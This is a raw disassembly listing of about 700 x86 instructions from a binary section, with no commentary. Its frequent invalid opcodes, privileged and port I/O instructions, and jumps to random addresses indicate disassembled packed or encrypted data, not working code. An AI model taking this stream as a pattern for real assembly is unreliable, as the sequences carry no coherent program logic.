  419f18:	xor    eax,DWORD PTR [edx-0x4]
  419f1b:	ds cmp eax,0x26d97ce5
  419f21:	mov    ds:0x6264fcb3,eax
  419f26:	sub    eax,0xa98d17fa
  419f2b:	imul   ecx,DWORD PTR [edi+0x2ae2942c],0x85856ba8
  419f35:	js     0x419eee
  419f37:	(bad)  
  419f38:	cli    
  419f39:	stos   BYTE PTR es:[edi],al
  419f3a:	mov    edx,0x15ec6a9e
  419f3f:	(bad)  
  419f40:	cmp    al,0x6c
  419f42:	scas   eax,DWORD PTR es:[edi]
  419f43:	cdq    
  419f44:	inc    ecx
  419f45:	outs   dx,BYTE PTR ds:[esi]
  419f46:	dec    ebx
  419f47:	sub    al,0x63
  419f49:	push   ss
  419f4a:	xadd   BYTE PTR [eax-0x20],cl
  419f4e:	add    bl,dh
  419f50:	ins    BYTE PTR es:[edi],dx
  419f51:	mov    WORD PTR ds:0xe95c716b,es
  419f57:	int    0xb0
  419f59:	loopne 0x419f2d
  419f5b:	dec    esi
  419f5c:	ins    DWORD PTR es:[edi],dx
  419f5d:	int3   
  419f5e:	jo     0x419fbe
  419f60:	leave  
  419f61:	xchg   edi,eax
  419f62:	add    eax,0x672b888a
  419f67:	(bad)  
  419f69:	cmp    cl,bl
  419f6b:	inc    edx
  419f6c:	dec    esp
  419f6d:	outs   dx,BYTE PTR ds:[esi]
  419f6e:	xchg   ebp,eax
  419f6f:	das    
  419f70:	dec    ebx
  419f71:	ins    DWORD PTR es:[edi],dx
  419f72:	add    al,0x5a
  419f74:	cli    
  419f75:	(bad)  
  419f76:	push   esp
  419f77:	and    esp,edi
  419f79:	mov    ah,0x2e
  419f7b:	sar    DWORD PTR [ecx+0x71],1
  419f7e:	(bad)  
  419f7f:	test   eax,0xe03bb92c
  419f84:	mov    ecx,DWORD PTR [edi]
  419f86:	jbe    0x419ff0
  419f88:	adc    esp,DWORD PTR [edi+edx*2-0x33]
  419f8c:	pushw  ds
  419f8e:	pop    ecx
  419f8f:	xor    DWORD PTR [eax],edi
  419f91:	out    dx,eax
  419f92:	dec    edi
  419f93:	mov    ah,0xfa
  419f95:	adc    al,0xa9
  419f97:	(bad)  
  419f99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419f9a:	adc    edx,ebp
  419f9c:	pop    ss
  419f9d:	movnti DWORD PTR [ebp-0x42],esp
  419fa1:	xor    bh,BYTE PTR [ebp-0x18]
  419fa4:	pop    ebp
  419fa5:	push   ss
  419fa6:	int3   
  419fa7:	fsub   DWORD PTR [ebp+0x56]
  419faa:	ror    DWORD PTR [ecx+0x51],cl
  419fad:	pop    ebp
  419fae:	add    DWORD PTR [edi-0x4d],ebx
  419fb1:	sbb    edx,esi
  419fb3:	fs test eax,0x2c56120c
  419fb9:	les    ebx,FWORD PTR [edx]
  419fbb:	xor    al,0x7
  419fbd:	out    0x24,eax
  419fbf:	aas    
  419fc0:	fimul  DWORD PTR [ebx+0x60]
  419fc3:	stos   DWORD PTR es:[edi],eax
  419fc4:	push   ebp
  419fc5:	or     eax,0x83b653e7
  419fca:	sbb    ebx,ebp
  419fcc:	(bad)  
  419fcd:	jmp    0xc95b:0x3cae008c
  419fd4:	cmp    dh,cl
  419fd6:	adc    cl,0x69
  419fd9:	mov    edi,0x3f71adfa
  419fde:	js     0x41a05a
  419fe0:	aam    0xb7
  419fe2:	push   cs
  419fe3:	adc    al,0x85
  419fe5:	fst    DWORD PTR [esp+0x147571d8]
  419fec:	out    0x6f,eax
  419fee:	out    0xb5,al
  419ff0:	jg     0x419fe9
  419ff2:	and    BYTE PTR [edi+0x33e5a5e1],bh
  419ff8:	jnp    0xe523e957
  419ffe:	stos   BYTE PTR es:[edi],al
  419fff:	mov    ds:0x5296b17c,eax
  41a004:	sbb    al,0x8b
  41a006:	test   BYTE PTR [edx],0xba
  41a009:	pop    ebx
  41a00a:	popa   
  41a00b:	sbb    ah,bh
  41a00d:	xor    al,0x5e
  41a00f:	mov    al,0x6b
  41a011:	test   al,0xcc
  41a013:	popf   
  41a014:	pop    ebx
  41a015:	fsubr  QWORD PTR ds:0x43b4ceeb
  41a01b:	out    dx,al
  41a01c:	mov    dl,0xac
  41a01e:	adc    eax,0x78825c56
  41a023:	push   ebp
  41a024:	sbb    DWORD PTR [esi+ecx*2-0x19],ebx
  41a028:	xchg   esi,eax
  41a029:	adc    BYTE PTR [ebx-0x2d97387f],0x63
  41a030:	inc    ebx
  41a031:	pop    ecx
  41a032:	clc    
  41a033:	mov    esi,0xc9d6755d
  41a038:	mov    esi,0xa8717d70
  41a03d:	mov    dl,BYTE PTR [edx+0x43]
  41a040:	jmp    0x41a012
  41a042:	cld    
  41a043:	es xchg edx,eax
  41a045:	push   ecx
  41a046:	imul   esi,DWORD PTR [ecx],0x2c
  41a049:	pop    eax
  41a04a:	cmp    dh,BYTE PTR [ebx+eiz*8]
  41a04d:	fwait
  41a04e:	dec    esi
  41a04f:	popfw  
  41a051:	data16 jne 0x41a09d
  41a054:	xchg   ebp,eax
  41a055:	pop    ss
  41a056:	mov    ds:0x76b5580b,al
  41a05b:	idiv   BYTE PTR [ecx]
  41a05d:	mov    edi,0x2f0b22b8
  41a062:	cmp    BYTE PTR [ebx-0x52649a13],ch
  41a068:	ret    0x39
  41a06b:	xchg   ecx,eax
  41a06c:	sub    DWORD PTR [edx+0x13],esi
  41a06f:	sub    eax,0x4469eb94
  41a074:	aaa    
  41a075:	fsub   st(0),st
  41a077:	aad    0x87
  41a079:	sbb    eax,0x81fb1b04
  41a07e:	(bad)  
  41a081:	retf   
  41a082:	add    al,0x18
  41a084:	add    BYTE PTR [edi-0x12fe482],dh
  41a08a:	mov    bl,0xb
  41a08c:	test   DWORD PTR [eax-0x438fec43],0x7e04c33c
  41a096:	fbstp  TBYTE PTR [edx+0x55]
  41a099:	and    eax,0x1114e404
  41a09e:	xor    ch,BYTE PTR [ebx+0x7b]
  41a0a1:	arpl   sp,ax
  41a0a3:	jo     0x41a06c
  41a0a5:	(bad)  [eax+0x6]
  41a0a8:	adc    dh,BYTE PTR [eax+0x1a]
  41a0ab:	js     0x41a041
  41a0ad:	cmp    bh,BYTE PTR [eax+0x4d8ff7b5]
  41a0b3:	add    eax,0x214daa47
  41a0b8:	dec    edx
  41a0b9:	push   esp
  41a0ba:	push   ebp
  41a0bb:	xchg   ebp,eax
  41a0bc:	or     BYTE PTR [esp+ecx*8],bh
  41a0bf:	xor    dl,BYTE PTR [ebx+0x27]
  41a0c2:	fdiv   QWORD PTR [bp+di]
  41a0c5:	xor    DWORD PTR [ecx],0x233363b
  41a0cb:	fstp   TBYTE PTR [ebp-0x21]
  41a0ce:	mov    ebp,DWORD PTR [ebp-0x4546806f]
  41a0d4:	inc    edi
  41a0d5:	mov    dh,0x99
  41a0d7:	jl     0x41a122
  41a0d9:	in     al,dx
  41a0da:	jb     0x41a12a
  41a0dc:	sbb    BYTE PTR [edi+0x30be8a8b],ah
  41a0e2:	mov    ah,0x8a
  41a0e4:	mov    bh,0xc6
  41a0e6:	test   DWORD PTR [eax-0x666e2c53],ebp
  41a0ec:	shl    BYTE PTR ds:0x8628693e,cl
  41a0f2:	mov    al,0x63
  41a0f4:	xlat   BYTE PTR ds:[ebx]
  41a0f5:	and    al,0x5e
  41a0f7:	and    esi,DWORD PTR [ebx+eax*1+0x159d184b]
  41a0fe:	lahf   
  41a0ff:	scas   al,BYTE PTR es:[edi]
  41a100:	dec    eax
  41a101:	mov    ch,0x7
  41a103:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a104:	pop    ebp
  41a105:	dec    esi
  41a106:	fsubrp st(6),st
  41a108:	push   ds
  41a109:	jmp    0x72c841e
  41a10e:	aaa    
  41a10f:	ret    
  41a110:	xlat   BYTE PTR ds:[ebx]
  41a111:	retf   
  41a112:	mov    al,ds:0x2149276
  41a117:	mov    dl,0x5f
  41a119:	scas   al,BYTE PTR es:[edi]
  41a11a:	pop    eax
  41a11b:	imul   eax,DWORD PTR [edi+0x694b6ecf],0xffffffac
  41a122:	and    DWORD PTR [edi],ecx
  41a124:	dec    esi
  41a125:	shl    eax,0x18
  41a128:	repnz pop esp
  41a12a:	nop
  41a12b:	jb     0x41a0c9
  41a12d:	mov    BYTE PTR [esi-0x741da771],bl
  41a133:	jno    0x41a101
  41a135:	push   0xa23b283e
  41a13a:	std    
  41a13b:	push   ebx
  41a13c:	mov    cl,0x35
  41a13e:	or     eax,0xe0d3d01b
  41a143:	pop    eax
  41a144:	or     BYTE PTR [eax+0x47a61fa2],ch
  41a14a:	icebp  
  41a14b:	lock fadd QWORD PTR [eax]
  41a14e:	sub    esp,DWORD PTR [edx-0x3bcd0b1e]
  41a154:	inc    esi
  41a155:	leave  
  41a156:	outs   dx,DWORD PTR ds:[esi]
  41a157:	adc    ebp,DWORD PTR [ecx]
  41a159:	sub    BYTE PTR [edi-0xf4bbc3d],0xdd
  41a160:	or     ch,BYTE PTR [ebx+0x162c78b4]
  41a166:	mov    ch,0x57
  41a168:	adc    ah,ch
  41a16a:	lods   eax,DWORD PTR ds:[esi]
  41a16b:	push   ebp
  41a16c:	out    0xa7,al
  41a16e:	in     al,0xb7
  41a170:	nop
  41a171:	mov    ebx,0x64b33eb0
  41a176:	scas   eax,DWORD PTR es:[edi]
  41a177:	mov    eax,0x935dd8a
  41a17c:	dec    ecx
  41a17d:	jg     0x41a15d
  41a17f:	loopne 0x41a1a7
  41a181:	es daa 
  41a183:	xor    BYTE PTR [ebp-0x53],0x4
  41a187:	call   0x9d6b3d5d
  41a18c:	dec    DWORD PTR [eax-0xf]
  41a18f:	addr16 out 0x62,eax
  41a192:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a193:	dec    edi
  41a194:	cmp    edx,DWORD PTR [ebx]
  41a196:	enter  0xcfda,0xb5
  41a19a:	sub    al,0x93
  41a19c:	aaa    
  41a19d:	adc    eax,0xe7a9275d
  41a1a2:	add    edx,DWORD PTR [edx+0x7074a462]
  41a1a8:	cmp    DWORD PTR [eax-0x17c6aa71],edi
  41a1ae:	cdq    
  41a1af:	add    dh,al
  41a1b1:	aam    0xa6
  41a1b3:	shl    BYTE PTR [ebx],cl
  41a1b5:	sbb    DWORD PTR [eax+0x4bf4dd3d],eax
  41a1bb:	sbb    al,0x1b
  41a1bd:	jno    0x41a1df
  41a1bf:	mov    bl,cl
  41a1c1:	lock inc edi
  41a1c3:	adc    eax,0x40d77bca
  41a1c8:	or     DWORD PTR [eax-0x59],ebp
  41a1cb:	jl     0x41a1a4
  41a1cd:	pop    DWORD PTR [edi-0x41]
  41a1d0:	dec    ebx
  41a1d1:	arpl   dx,si
  41a1d3:	add    DWORD PTR [ebx-0x4c],edx
  41a1d6:	neg    DWORD PTR [ecx-0x7a07f8d8]
  41a1dc:	daa    
  41a1dd:	sub    esp,DWORD PTR [edx+0x16]
  41a1e0:	push   cs
  41a1e1:	inc    BYTE PTR ds:0x7bb58040
  41a1e7:	dec    eax
  41a1e8:	outs   dx,DWORD PTR ds:[esi]
  41a1e9:	xchg   BYTE PTR [edx+esi*1],bh
  41a1ec:	push   cs
  41a1ed:	ret    0x84af
  41a1f0:	inc    eax
  41a1f1:	xor    dl,cl
  41a1f3:	int    0xc6
  41a1f5:	cld    
  41a1f6:	jo     0x41a253
  41a1f8:	test   eax,0x52a1baad
  41a1fd:	sti    
  41a1fe:	jo     0x41a258
  41a200:	sbb    cl,BYTE PTR [eax+0x18]
  41a203:	retw   
  41a205:	jmp    0xf38e:0x4f8f6953
  41a20c:	shr    DWORD PTR [ebp+0x2e83365e],1
  41a212:	sbb    BYTE PTR ds:0xec41218c,al
  41a218:	shl    DWORD PTR [ecx+ebp*1-0x7ae7159a],0x56
  41a220:	test   eax,0xdb34583d
  41a225:	sub    dl,ch
  41a227:	rcr    BYTE PTR [esi+0x6fd4b1c6],1
  41a22d:	(bad)  
  41a22e:	lock add al,0xa7
  41a231:	sub    eax,0x8d4b60a5
  41a236:	pop    eax
  41a237:	repz add eax,0x4cd3ff9f
  41a23d:	sub    DWORD PTR [edx],edi
  41a23f:	jp     0x41a22a
  41a241:	push   ebp
  41a242:	inc    esp
  41a243:	xchg   BYTE PTR [edi+0x28],dh
  41a246:	inc    ebp
  41a247:	mov    esi,?
  41a249:	scas   eax,DWORD PTR es:[edi]
  41a24a:	add    DWORD PTR [ecx+eiz*4],0x4fbf7c67
  41a251:	xchg   esi,eax
  41a252:	mov    edi,0x7494cc9
  41a257:	mov    al,ds:0xf454766f
  41a25c:	shl    BYTE PTR [edx],1
  41a25e:	mov    esp,0x24778a4d
  41a263:	ins    BYTE PTR es:[edi],dx
  41a264:	adc    edx,DWORD PTR [edi+0x52]
  41a267:	inc    ebx
  41a268:	lahf   
  41a269:	cld    
  41a26a:	and    eax,0xc11f651e
  41a26f:	out    dx,eax
  41a270:	adc    esp,0xb0b2083f
  41a276:	(bad)  
  41a277:	pusha  
  41a278:	push   es
  41a279:	dec    esi
  41a27a:	add    esi,edx
  41a27c:	push   eax
  41a27d:	jmp    0x41a23c
  41a27f:	jns    0x41a217
  41a281:	js     0x41a22f
  41a283:	imul   edx,DWORD PTR [eax-0x63],0xffffffe4
  41a287:	jb     0x41a2d8
  41a289:	rol    BYTE PTR [edi],1
  41a28b:	fwait
  41a28c:	out    dx,al
  41a28d:	fimul  DWORD PTR [eax+0x31fc65d0]
  41a293:	and    esi,DWORD PTR [ebx-0x31]
  41a296:	aad    0xaf
  41a298:	inc    BYTE PTR [ebx]
  41a29a:	sub    DWORD PTR [ebx+0x4b],esi
  41a29d:	xchg   esp,eax
  41a29e:	ss xchg ch,dh
  41a2a1:	mov    BYTE PTR [ebx-0x3e67c57a],0x77
  41a2a8:	inc    edx
  41a2a9:	cmc    
  41a2aa:	imul   esp,DWORD PTR [ebx+0x356b7529],0x68
  41a2b1:	jge    0x41a235
  41a2b3:	sub    bh,BYTE PTR [ebx+0x3e]
  41a2b6:	repz mov al,ds:0xefc3bc17
  41a2bc:	sbb    eax,0x6af66045
  41a2c1:	mov    edx,0x39b22a1c
  41a2c6:	and    edi,DWORD PTR [eax-0x5e]
  41a2c9:	stc    
  41a2ca:	clc    
  41a2cb:	es or  edx,edx
  41a2ce:	xchg   esi,eax
  41a2cf:	inc    esi
  41a2d0:	adc    al,BYTE PTR [ecx+0xa4dad4]
  41a2d6:	or     al,0xf1
  41a2d8:	leave  
  41a2d9:	mov    ecx,0x43f5a47b
  41a2de:	mov    al,ds:0xc617d41b
  41a2e3:	test   al,0xde
  41a2e5:	test   BYTE PTR [eax-0x94f9698],ah
  41a2eb:	jge    0x41a2e9
  41a2ed:	cli    
  41a2ee:	popf   
  41a2ef:	pop    ebx
  41a2f0:	jle    0x41a2d7
  41a2f2:	nop
  41a2f3:	iret   
  41a2f4:	mov    edx,0x9bbaca02
  41a2f9:	xchg   BYTE PTR [eax+edx*2-0x1fbdf911],cl
  41a300:	pushf  
  41a301:	loopne 0x41a33d
  41a303:	addr16 or dl,ch
  41a306:	outs   dx,DWORD PTR ds:[esi]
  41a307:	push   cs
  41a308:	adc    al,0x26
  41a30a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a30b:	xchg   edx,eax
  41a30c:	repz jo 0x41a389
  41a30f:	call   0x165f15b7
  41a314:	pop    esp
  41a315:	sub    DWORD PTR [eax-0x15],esp
  41a318:	sbb    esp,DWORD PTR [eax]
  41a31a:	arpl   WORD PTR [eax-0x25f0ae20],ax
  41a320:	inc    ecx
  41a321:	jmp    0x8c435413
  41a326:	dec    esi
  41a327:	jb     0x41a319
  41a329:	enter  0xf59c,0xc3
  41a32d:	fs in  al,0x41
  41a330:	sbb    ch,BYTE PTR [edi]
  41a332:	jle    0x41a2e2
  41a334:	push   eax
  41a335:	ror    BYTE PTR [eax],0xa4
  41a338:	fstp   TBYTE PTR [ebp-0x7b]
  41a33b:	jnp    0x41a38f
  41a33d:	out    dx,eax
  41a33e:	or     cl,dl
  41a340:	popf   
  41a341:	mov    BYTE PTR [edi+0xd0b16d4],dh
  41a347:	(bad)  
  41a348:	adc    al,0x51
  41a34a:	dec    esi
  41a34b:	scas   al,BYTE PTR es:[edi]
  41a34c:	ins    DWORD PTR es:[edi],dx
  41a34d:	mov    ecx,0xbd8b3dac
  41a352:	cmp    al,0xe5
  41a354:	test   BYTE PTR ds:0x23c8da93,bh
  41a35a:	ror    DWORD PTR [esi-0x2fa1f1f8],cl
  41a360:	enter  0xf351,0xe6
  41a364:	push   0x819b6857
  41a369:	mov    al,0x42
  41a36b:	xor    BYTE PTR [ebx-0x6cee4341],bl
  41a371:	jp     0x41a3da
  41a373:	sbb    DWORD PTR [ecx-0x72],ecx
  41a376:	arpl   bp,cx
  41a378:	pusha  
  41a379:	mov    dh,0xda
  41a37b:	dec    edi
  41a37c:	test   eax,0xa65440cd
  41a381:	mov    esi,ebp
  41a383:	inc    esp
  41a384:	mov    esp,0x46b96eb2
  41a389:	scas   eax,DWORD PTR es:[edi]
  41a38a:	daa    
  41a38b:	mov    edx,DWORD PTR [edx]
  41a38d:	inc    eax
  41a38e:	stc    
  41a38f:	mov    ebp,0xbbc246f0
  41a394:	mov    esp,0x7f61cd8a
  41a399:	mov    ds:0xd924a997,eax
  41a39e:	icebp  
  41a39f:	mul    BYTE PTR [ebx]
  41a3a1:	clc    
  41a3a2:	sub    DWORD PTR [esi-0x61],edi
  41a3a5:	jecxz  0x41a379
  41a3a7:	or     DWORD PTR [edx+eax*2-0x49140afd],esi
  41a3ae:	xor    al,0xc1
  41a3b0:	mov    edi,0x2ab40287
  41a3b5:	sbb    DWORD PTR [ebx],esi
  41a3b7:	aam    0x55
  41a3b9:	push   cs
  41a3ba:	adc    ebp,DWORD PTR [edx]
  41a3bc:	xor    DWORD PTR [eax],ebx
  41a3be:	jge    0x41a3cd
  41a3c0:	and    ah,BYTE PTR [edi-0x42]
  41a3c3:	or     BYTE PTR [ebx],0xf6
  41a3c6:	mov    dh,0x4b
  41a3c8:	dec    ecx
  41a3c9:	mov    dh,0x56
  41a3cb:	popf   
  41a3cc:	mov    esi,0xb50e6d
  41a3d1:	rcr    DWORD PTR [ebx-0x2f],0xed
  41a3d5:	push   0x44
  41a3d7:	push   ds
  41a3d8:	pop    eax
  41a3d9:	test   eax,0x69f72f77
  41a3de:	repz mov edi,0x560cece7
  41a3e4:	in     eax,0x9e
  41a3e6:	sbb    BYTE PTR [esi-0x7e],dl
  41a3e9:	push   edx
  41a3ea:	lods   al,BYTE PTR ds:[esi]
  41a3eb:	sar    ebx,0x2a
  41a3ee:	call   0x66c8807b
  41a3f3:	jle    0x41a450
  41a3f5:	out    dx,eax
  41a3f6:	in     eax,0xcc
  41a3f8:	aam    0xd5
  41a3fa:	pop    ebp
  41a3fb:	add    ebx,ebp
  41a3fd:	ror    DWORD PTR [edx+0x52],cl
  41a400:	icebp  
  41a401:	fsubr  QWORD PTR [esi]
  41a403:	lea    esi,[ebp-0x8bda489]
  41a409:	mov    ebp,0xd6e7d989
  41a40e:	push   ebp
  41a40f:	push   0x9
  41a411:	pop    ebx
  41a412:	into   
  41a413:	data16 or al,0xc5
  41a416:	js     0x41a3ba
  41a418:	ret    
  41a419:	(bad)  
  41a41b:	mov    bh,0xde
  41a41d:	adc    DWORD PTR [eax+ecx*2+0x10628e90],ebp
  41a424:	or     eax,0x6088e9f9
  41a429:	scas   al,BYTE PTR es:[edi]
  41a42a:	and    eax,0x15eb7351
  41a42f:	push   es
  41a430:	sbb    esp,DWORD PTR [ecx-0x69]
  41a433:	dec    ebx
  41a434:	or     ah,BYTE PTR [ebx+0x5a]
  41a437:	out    dx,eax
  41a438:	mov    ah,0x8
  41a43a:	pusha  
  41a43b:	push   eax
  41a43c:	ss in  eax,dx
  41a43e:	push   es
  41a43f:	data16 mov ?,WORD PTR [edx-0x4e]
  41a443:	loop   0x41a3e2
  41a445:	rcr    DWORD PTR [ebx+edx*8+0x7b],cl
  41a449:	adc    bl,BYTE PTR [eax+0x5]
  41a44c:	fs loope 0x41a462
  41a44f:	inc    esp
  41a450:	push   0x71
  41a452:	std    
  41a453:	imul   esp,ebx,0x70ce39b1
  41a459:	mov    eax,ds:0xf50cd139
  41a45e:	out    0x56,eax
  41a460:	sub    eax,0xcf75575d
  41a465:	addr16 xchg esi,eax
  41a467:	push   cs
  41a468:	hlt    
  41a469:	pop    ecx
  41a46a:	push   0x609041f1
  41a46f:	js     0x41a484
  41a471:	in     eax,0xcf
  41a473:	push   esi
  41a474:	popa   
  41a475:	lock outs dx,DWORD PTR ds:[si]
  41a478:	push   edi
  41a479:	xchg   esi,eax
  41a47a:	(bad)  
  41a47b:	nop
  41a47c:	mov    ds:0x47f132c,al
  41a481:	cmp    dh,BYTE PTR [ebx+0x3017f39f]
  41a487:	fs jle 0x41a4bf
  41a48a:	and    al,0x83
  41a48c:	out    dx,al
  41a48d:	cmp    eax,0xf3be842e
  41a492:	mov    edx,0xf92e5162
  41a497:	(bad)  
  41a499:	pop    ecx
  41a49a:	outs   dx,BYTE PTR ds:[esi]
  41a49b:	xchg   esp,eax
  41a49c:	inc    ebp
  41a49d:	push   edi
  41a49e:	rcr    BYTE PTR [eax-0x60],cl
  41a4a1:	xchg   ebp,eax
  41a4a2:	cdq    
  41a4a3:	enter  0xe560,0xed
  41a4a7:	inc    BYTE PTR [edi+0x73]
  41a4aa:	add    al,ch
  41a4ac:	in     eax,dx
  41a4ad:	enter  0x5fa4,0x4c
  41a4b1:	xchg   DWORD PTR [ecx],esi
  41a4b3:	jbe    0x41a448
  41a4b5:	(bad)  
  41a4b6:	iret   
  41a4b7:	mov    ebp,0x6d6e8bce
  41a4bc:	or     DWORD PTR [eax+0x45],0x1e8f4316
  41a4c3:	(bad)  
  41a4c4:	sub    edi,edi
  41a4c6:	jbe    0x41a529
  41a4c8:	repnz push ecx
  41a4ca:	cmp    DWORD PTR [ebx+0x2],eax
  41a4cd:	sbb    eax,0xc602a2
  41a4d2:	sub    DWORD PTR [edi-0x54fcc0cf],edi
  41a4d8:	jge    0x41a550
  41a4da:	je     0x41a4b8
  41a4dc:	stos   DWORD PTR es:[edi],eax
  41a4dd:	gs pop ecx
  41a4df:	and    cl,BYTE PTR ds:0xa7117fae
  41a4e5:	cmp    dl,BYTE PTR ss:[ecx+0x77]
  41a4e9:	ret    0x960f
  41a4ec:	mov    ch,0x9c
  41a4ee:	test   ebp,eax
  41a4f0:	inc    DWORD PTR [ecx+0x6c2c021d]
  41a4f6:	xor    eax,esp
  41a4f8:	jo     0x41a52b
  41a4fa:	xlat   BYTE PTR ds:[ebx]
  41a4fb:	and    edi,edi
  41a4fd:	push   ecx
  41a4fe:	fcomp  DWORD PTR [ebx-0x28]
  41a501:	adc    DWORD PTR [esi-0x3f493170],esp
  41a507:	(bad)  
  41a508:	or     ah,BYTE PTR [ebx]
  41a50a:	imul   edi,DWORD PTR [eax-0x6b0c9338],0xffffffec
  41a511:	jge    0x41a547
  41a513:	jle    0x41a536
  41a515:	cmp    DWORD PTR [esi-0x2d],eax
  41a518:	cli    
  41a519:	mov    dl,0xa1
  41a51b:	push   edx
  41a51c:	xchg   ecx,eax
  41a51d:	mov    es,WORD PTR ds:0xff950c89
  41a523:	push   esi
  41a524:	dec    ebp
  41a525:	ss dec eax
  41a527:	pop    edi
  41a528:	pop    ds
  41a529:	aas    
  41a52a:	scas   al,BYTE PTR es:[edi]
  41a52b:	jmp    0x9f8361b6
  41a530:	mov    ebx,0x2119a7ae
  41a535:	sub    al,0xd4
  41a537:	sbb    al,0x3
  41a539:	in     eax,dx
  41a53a:	fstp   DWORD PTR [ebx-0x55953b02]
  41a540:	inc    ecx
  41a541:	pop    edx
  41a542:	add    DWORD PTR [ebx-0x41210ed0],edx
  41a548:	icebp  
  41a549:	je     0x41a51a
  41a54b:	fadd   DWORD PTR [edx+0xe]
  41a54e:	pop    eax
  41a54f:	int3   
  41a550:	push   esi
  41a551:	xchg   BYTE PTR [edx+0x29213cca],ch
  41a557:	jnp    0x41a56e
  41a559:	fs push ebp
  41a55b:	cs dec ecx
  41a55d:	imul   esp,DWORD PTR [eax-0x6e],0xfffffff7
  41a561:	push   eax
  41a562:	pop    edi
  41a563:	pushf  
  41a564:	in     al,dx
  41a565:	push   0x38
  41a567:	sbb    dl,BYTE PTR [edi-0x3dc1c9a3]
  41a56d:	lea    ebp,[edi]
  41a56f:	xchg   esi,eax
  41a570:	lock out 0x59,eax
  41a573:	xchg   ebp,eax
  41a574:	add    eax,0x99455b83
  41a579:	out    dx,al
  41a57a:	mov    ebp,0x2eb16b7d
  41a57f:	inc    eax
  41a580:	inc    edx
  41a581:	push   ds
  41a582:	xor    eax,0x735bfed9
  41a587:	sbb    eax,0xdf5dc587
  41a58c:	dec    edx
  41a58d:	and    DWORD PTR [edx],ebp
  41a58f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a590:	jecxz  0x41a5ad
  41a592:	loope  0x41a5c2
  41a594:	fstp   QWORD PTR [ebp-0x38]
  41a597:	adc    DWORD PTR fs:[edi+0x5631f717],ecx
  41a59e:	fwait
  41a59f:	push   eax
  41a5a0:	sub    edx,eax
  41a5a2:	push   edx
  41a5a3:	adc    BYTE PTR ds:0xa9bfc3b,dh
  41a5a9:	mov    dh,0x5f
  41a5ab:	or     al,BYTE PTR [ecx]
  41a5ad:	aam    0xa2
  41a5af:	mov    ebx,0xecacca09
  41a5b4:	or     cl,cl
  41a5b6:	cmp    dl,BYTE PTR fs:[ecx+0x130f7d21]
  41a5bd:	mov    edi,0xe68ca8e
  41a5c2:	xor    al,0xa4
  41a5c4:	mov    esp,0xb9aba70b
  41a5c9:	rol    BYTE PTR [edi],1
  41a5cb:	mov    DWORD PTR [esp+ebp*8+0x5a1976cc],ebp
  41a5d2:	mov    BYTE PTR [eax-0x4f],bh
  41a5d5:	cmp    ch,BYTE PTR [ebx+0x1c]
  41a5d8:	push   ebp
  41a5d9:	xor    eax,0x1274a85d
  41a5de:	inc    ebp
  41a5df:	xor    ah,BYTE PTR [ebx+0x5cb9cbac]
  41a5e5:	ds (bad) 
  41a5e7:	out    0xc2,eax
  41a5e9:	ror    BYTE PTR [ebp-0x8],1
  41a5ec:	das    
  41a5ed:	stos   BYTE PTR es:[edi],al
  41a5ee:	test   eax,0x3ce6ebe3
  41a5f3:	hlt    
  41a5f4:	icebp  
  41a5f5:	xchg   ebp,eax
  41a5f6:	sbb    ebp,DWORD PTR ds:0xea3b41b3
  41a5fc:	hlt    
  41a5fd:	gs out dx,al
  41a5ff:	stos   BYTE PTR es:[edi],al
  41a600:	and    bl,BYTE PTR [eax]
  41a602:	int    0xe2
  41a604:	lods   al,BYTE PTR ds:[esi]
  41a605:	dec    edi
  41a606:	push   eax
  41a607:	cld    
  41a608:	scas   eax,DWORD PTR es:[edi]
  41a609:	push   eax
  41a60a:	xchg   esp,edx
  41a60c:	xchg   edx,eax
  41a60d:	mov    BYTE PTR [ecx-0xb176402],dl
  41a613:	ret    0x7dc3
  41a616:	test   BYTE PTR [edx-0x3d61f927],bh
  41a61c:	in     al,0x8
  41a61e:	iret   
  41a61f:	lock in eax,0xee
  41a622:	sbb    al,BYTE PTR [eax-0x33]
  41a625:	(bad)  
  41a626:	mov    eax,0x9946ff69
  41a62b:	inc    ebp
  41a62c:	aam    0x9c
  41a62e:	les    edx,FWORD PTR [esp+eax*2+0x13]
  41a632:	mov    dh,BYTE PTR [ebx+0x444d88ab]
  41a638:	adc    al,0xa6
  41a63a:	mov    bh,0xf
  41a63c:	fst    DWORD PTR [edx-0x5d51e33c]
  41a642:	push   ss
  41a643:	jecxz  0x41a647
  41a645:	fwait
  41a646:	xchg   ecx,eax
  41a647:	stc    
  41a648:	mov    ebp,0xe03791c2
  41a64d:	pop    edx
  41a64e:	xor    eax,0xd92e976e
  41a653:	xchg   esp,eax
  41a654:	pop    ecx
  41a655:	je     0x41a6d5
  41a657:	add    BYTE PTR [ecx-0x7c],dl
  41a65a:	js     0x41a650
  41a65c:	sbb    esi,DWORD PTR [edi]
  41a65e:	xor    DWORD PTR [edx-0x48],eax
  41a661:	add    al,0x9d
  41a663:	or     edi,DWORD PTR [ebp+0x44]
  41a666:	mov    bl,0x83
  41a668:	mov    eax,ds:0x51a46fe6
  41a66d:	inc    edi
  41a66e:	add    edi,DWORD PTR [edi-0x7]
  41a671:	mov    ds:0xc2884f3,eax
  41a676:	dec    ebx
  41a677:	popf   
  41a678:	fadd   QWORD PTR [edx+ebx*1]
  41a67b:	jb     0x41a667
  41a67d:	and    bl,BYTE PTR [ecx+0x2f3bd5d4]
  41a683:	jecxz  0x41a67a
  41a685:	ins    DWORD PTR es:[edi],dx
  41a686:	dec    ebp
  41a687:	push   0xdd4acea7
  41a68c:	(bad)  
  41a68d:	enter  0x1def,0xd8
  41a691:	lds    edi,FWORD PTR [ebx]
  41a693:	je     0x41a633
  41a695:	push   ebp
  41a696:	mov    al,0x36
  41a698:	push   ecx
  41a699:	mov    eax,0x71e2e992
  41a69e:	lods   al,BYTE PTR ds:[esi]
  41a69f:	xchg   ebp,eax
  41a6a0:	(bad)  
  41a6a1:	call   0x8ee1af5e
  41a6a6:	scas   al,BYTE PTR es:[edi]
  41a6a7:	hlt    
  41a6a8:	dec    ebx
  41a6a9:	aaa    
  41a6aa:	out    0x35,al
  41a6ac:	das    
  41a6ad:	hlt    
  41a6ae:	and    ch,BYTE PTR [ecx-0x4a]
  41a6b1:	inc    esp
  41a6b2:	jmp    0x41a6d8
  41a6b4:	lods   al,BYTE PTR ds:[esi]
  41a6b5:	sbb    esp,0x2ce8848e
  41a6bb:	push   cs
  41a6bc:	sar    BYTE PTR [ecx+0x619fdb6c],1
